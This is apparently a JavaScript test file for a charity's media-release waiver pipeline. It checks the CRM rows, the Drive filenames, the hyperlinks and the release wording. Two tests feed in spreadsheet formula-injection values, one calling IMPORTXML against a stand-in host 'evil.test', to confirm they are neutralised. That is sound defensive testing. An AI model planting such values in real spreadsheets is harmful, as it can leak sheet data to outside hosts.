// The signed release has to be FINDABLE, not just stored.
//
// Four properties are pinned here, because each one fails quietly in production:
//
//   1. The CRM row carries the participant, not just whoever held the pen. When a
//      parent signs for a child, staff look up the child.
//   2. The Drive filename is human-readable. `release-<uuid>.pdf` is a complete
//      archive and an unusable one.
//   3. The link column is a real hyperlink to the Drive copy — the whole point of
//      the row is getting from a name to the signed PDF in one click.
//   4. The release the signer agrees to actually names every initiative it now
//      covers. A release that says "Adapt To Life and Adaptive Sports Near Me"
//      does not cover a photo printed on an Adapt Body Shop product, and the
//      only place that is visible is the document text itself.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { crmRow, archiveFilename, CRM_HEADERS } from "../src/waiver_crm.js";
import { colLetter, text, hyperlink, BOOKS } from "../src/sheets.js";

const HEADERS = CRM_HEADERS;
const at = (row, col) => row[HEADERS.indexOf(col)];

const ADULT = {
  id: "2d0c35bc-9794-4f4f-9bc4-80183a2c1cec",
  org: "atl",
  signer_name: "Dana Reyes",
  signer_email: "dana@example.org",
  signer_phone: "555-0100",
  signed_at: "2026-09-04T15:20:31.000Z",
  signer_kind: "adult",
  program: "Summer adaptive cycling clinic",
  waiver_version: "media-release-2026-09-04-v4",
  drive_link: "https://drive.google.com/file/d/abc123/view",
};
const GUARDIAN = {
  ...ADULT,
  id: "17fe2b33-eade-423a-8691-648999790df6",
  org: "asnm",
  signer_kind: "guardian",
  minor_name: "Sam Reyes",
  relationship: "Mother",
};

test("the CRM row is keyed on the participant, and still records who signed", () => {
  const adult = crmRow(ADULT, "2026-09-04T15:25:00.000Z");
  assert.equal(at(adult, "Participant"), "Dana Reyes");
  assert.equal(at(adult, "Signed by"), "Dana Reyes");
  assert.equal(at(adult, "Relationship"), "Self");
  assert.equal(at(adult, "Signer type"), "Adult");

  const minor = crmRow(GUARDIAN, "2026-09-04T15:25:00.000Z");
  assert.equal(at(minor, "Participant"), "Sam Reyes", "a guardian signing must not hide the child");
  assert.equal(at(minor, "Signed by"), "Dana Reyes");
  assert.equal(at(minor, "Relationship"), "Mother");
  assert.equal(at(minor, "Signer type"), "Parent / guardian");
});

test("the row carries contact details and the source site", () => {
  const row = crmRow(ADULT, "2026-09-04T15:25:00.000Z");
  assert.equal(at(row, "Signed"), "2026-09-04");
  assert.equal(at(row, "Email"), "dana@example.org");
  assert.equal(at(row, "Phone"), "555-0100");
  assert.equal(at(row, "Program or event"), "Summer adaptive cycling clinic");
  assert.equal(at(row, "Source"), "Adapt To Life");
  assert.equal(at(crmRow(GUARDIAN, "x2026-09-04T00:00:00Z"), "Source"), "Adaptive Sports Near Me");
  assert.equal(at(row, "Release version"), "media-release-2026-09-04-v4");
  assert.equal(at(row, "Document ID"), ADULT.id);
  assert.equal(row.length, HEADERS.length);
});

test("the waiver column links to the Drive copy, and verify links to the check", () => {
  const row = crmRow(ADULT, "2026-09-04T15:25:00.000Z");
  assert.equal(at(row, "Signed waiver"), '=HYPERLINK("https://drive.google.com/file/d/abc123/view","Open PDF")');
  assert.equal(at(row, "Verify"), `=HYPERLINK("https://sign.adapttolife.org/api/waiver/${ADULT.id}/verify","Verify")`);
  // A row that reached the CRM without a Drive copy would silently render
  // "=HYPERLINK("undefined"...)"; an empty cell is the honest answer.
  assert.equal(at(crmRow({ ...ADULT, drive_link: null }, "2026-09-04T00:00:00Z"), "Signed waiver"), "");
});

test("a quote in a name cannot break out of the HYPERLINK formula", () => {
  const row = crmRow({ ...ADULT, drive_link: 'https://drive.google.com/x","=IMPORTXML(1,1)' }, "2026-09-04T00:00:00Z");
  assert.equal((at(row, "Signed waiver").match(/"/g) || []).length, 4, "exactly the four quotes the formula needs");
});

test("the archived filename is something a human can scan", () => {
  assert.equal(archiveFilename(ADULT), "2026-09-04 Dana Reyes — release 2d0c35bc.pdf");
  assert.equal(archiveFilename(GUARDIAN), "2026-09-04 Sam Reyes — release 17fe2b33.pdf");
  // Drive tolerates slashes in names; a person copying the file to a laptop does not.
  assert.ok(!archiveFilename({ ...ADULT, signer_name: "A/B: C*D?" }).includes("/"));
});

test("column letters survive past Z", () => {
  assert.equal(colLetter(0), "A");
  assert.equal(colLetter(11), "L");
  assert.equal(colLetter(25), "Z");
  assert.equal(colLetter(26), "AA");
});

test("the release covers every Adapt To Life initiative it is used for", () => {
  const src = readFileSync(new URL("../src/waiver.js", import.meta.url), "utf8");
  for (const domain of ["adapttolife.org", "adaptivesportsnearme.com", "adaptbodyshop.com"]) {
    assert.ok(src.includes(domain), `the signed text must name ${domain}`);
  }
  // Adapt Body Shop sells things. Consent to promotional use by a charity is not
  // consent to appear on a product, so the release says so in its own words.
  assert.match(src, /products and merchandise/);
  assert.match(src, /no share of any proceeds/);
  // Future initiatives are covered without re-signing, which is the reason this
  // is one universal release rather than one per site.
  assert.match(src, /without a new signature/);
});

test("the release version was bumped with the text", () => {
  const src = readFileSync(new URL("../src/waiver.js", import.meta.url), "utf8");
  const m = src.match(/const VERSION = "([^"]+)"/);
  assert.ok(m, "VERSION must exist");
  assert.notEqual(m[1], "media-release-2026-06-27-v3", "changing the wording without the version leaves every PDF claiming the old text");
});

test("a signer cannot smuggle a formula into the CRM through their own name", () => {
  const row = crmRow({ ...ADULT, signer_name: '=IMPORTXML("http://evil.test","//a")', signer_phone: "+1 555 0100" }, "2026-09-04T00:00:00Z");
  assert.ok(at(row, "Participant").startsWith("'="), "a leading = must be neutralised");
  assert.ok(at(row, "Phone").startsWith("'+"), "so must + and - and @");
  assert.equal(at(row, "Email"), "dana@example.org", "an @ inside the value is not a leading @");
});

test("every field the form collects is a field the Worker reads", () => {
  const page = readFileSync(new URL("../public/waiver.html", import.meta.url), "utf8");
  const worker = readFileSync(new URL("../src/waiver.js", import.meta.url), "utf8");
  // The payload object the page POSTs — the only thing the Worker ever sees.
  const payload = page.match(/var payload = \{([\s\S]*?)\n      \};/);
  assert.ok(payload, "the submit payload must be findable");
  const keys = [...payload[1].matchAll(/(?:^|,)\s*(\w+)\s*:/gm)].map((m) => m[1]);
  assert.ok(keys.includes("phone"), "phone is collected on the page, so it has to be sent");
  for (const key of keys) {
    if (key === "agree" || key === "cf_token" || key === "org") continue;   // read by other names
    assert.match(worker, new RegExp(`data\\.${key}\\b`), `the Worker drops ${key} on the floor`);
  }
});

// --- the shared sheet contract -------------------------------------------
// These pin the paved road, not the waiver: the next form to reach the CRM
// reuses exactly this, and these are the properties it inherits for free.

test("a book must be declared before the Worker can write to it", () => {
  assert.equal(BOOKS.atlCrm, "1ahXuu11mV3bJVtyqXrhVz4lFCSSWpl7jX52SqlcJFLE");
  const src = readFileSync(new URL("../src/sheets.js", import.meta.url), "utf8");
  // Every id the Worker writes to comes from BOOKS. A spreadsheet id pasted
  // into a handler is the start of the sprawl this file exists to prevent.
  const ids = [...src.matchAll(/"1[A-Za-z0-9_-]{20,}"/g)].map((m) => m[0]);
  assert.equal(ids.length, 1, "sheets.js should carry exactly the declared books");
});

test("text() neutralises formulas anywhere a form feeds a cell", () => {
  for (const bad of ["=1+1", "+A1", "-2", "@import"]) {
    assert.ok(text(bad).startsWith("'"), `${bad} must be neutralised`);
  }
  assert.equal(text("dana@example.org"), "dana@example.org", "an @ inside the value is not a leading @");
  assert.equal(text(null), "");
});

test("hyperlink() is empty rather than a broken formula when there is no url", () => {
  assert.equal(hyperlink("", "Open"), "");
  assert.equal(hyperlink(null, "Open"), "");
  assert.equal(hyperlink("https://x.test/a", "Open"), '=HYPERLINK("https://x.test/a","Open")');
});
